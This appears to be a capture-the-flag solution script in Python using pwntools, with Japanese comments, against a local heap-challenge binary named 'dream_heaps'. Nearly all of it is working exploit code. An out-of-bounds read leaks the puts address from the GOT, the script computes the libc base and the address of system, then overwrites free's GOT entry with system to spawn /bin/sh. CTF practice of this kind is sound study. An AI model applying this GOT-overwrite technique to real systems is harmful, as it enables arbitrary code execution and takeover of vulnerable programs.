from pwn import *
import warnings
warnings.simplefilter("ignore")

target = process("./dream_heaps")
gdb.attach(target, gdbscript="b edit_dream")

""" 
systemを使うため使ってるlibcを読み込む
多分すべてincludeしているようなサイズの大きいファイルならそのファイルでよい
今回は問題の中にsystemがないのでELFで問題のファイルをインポートしようとすると
systemのpltを読み込む時にKeyErrorが発生する
"""
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

"""
HEAP_PTRSの先頭:         0x6020a0
gotを保持しているアドレス: 0x400538
0x6020a0 - 0x400538 = 0x201b68
64bitなので8byteごとに読み取るから
0x201b68 / 8 = 0x4036d(263021)
つまり-263021をreadで指定することで0x400538のgotテーブルのアドレスからprintfで中身を読み取り
putsのアドレスがリークされる
"""
def leak():
    target.recvuntil("> ")
    target.sendline("2")
    target.recvuntil("Which dream would you like to read?\n")
    target.sendline("-263021")
    puts = u64(target.recv(6) + b"\x00" * 2)
    return puts 

def write(size, content):
    target.recvuntil("> ")
    target.sendline("1")
    target.recvuntil("How long is your dream?\n")
    target.sendline(str(size))
    target.recvuntil("What are the contents of this dream?\n")
    target.sendline(content)

def edit(index, content):
    target.recvuntil("> ")
    target.sendline("3")
    target.recvuntil("Which dream would you like to change?")
    target.sendline(str(index))
    target.send(content)

def free():
    target.recvuntil("> ")
    target.sendline("4")
    target.recvuntil("Which dream would you like to delete?\n")
    target.sendline("0")

puts_address = leak()
puts_symbol = libc.symbols["puts"]
print("leak is         ", hex(puts_address))
print("puts symbol is  ", hex(puts_symbol))

libc_address = puts_address - puts_symbol
print("libc_address is ", hex(libc_address))

system = libc_address + libc.symbols["system"]
print("system is       ", hex(system))

#ここは10進数でもいい
write(10, "/bin/sh\x00")

""" 
#size指定がなぜか16進数じゃないとうまくいかない
#10進数で同じサイズ指定してもエラーでる
17じゃないと動かないっぽい 理由はよくわかっていない
"""
for i in range(17):
    write(0x10, "hello")

"""
freeのgotをsystemに書き換えてdelete_dreamがfree呼び出す際に
shellを呼ぶように仕向ける(最初のアドレスに/bin/shが書いてある)
"""
write(0x602018, "hello")
#なぜかこれがないと動かない
write(00, "0"*10)
edit(17, p64(system))
free()

target.interactive()